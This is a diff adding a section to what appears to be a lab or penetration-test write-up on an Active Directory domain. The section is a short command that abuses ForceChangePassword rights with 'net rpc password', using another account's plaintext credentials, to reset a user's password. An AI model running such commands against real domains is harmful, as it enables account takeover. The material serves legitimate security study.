@@ -416,5 +416,15 @@ He has read access on CertEnroll
 
 This user has ForceChangePassword on `jena.yamazaki`
 
+# Compromising `jena.yamazaki` using ForceChangePassword
+
+```python
+net rpc password "jena.yamazaki" 'Password123!' -U "dismay.hsm"/"guy.rookie"%'O0Aco9FQJQ' -S "10.0.16.4"
+```
+This changed the users password
+
+```python
+
+```
 
 
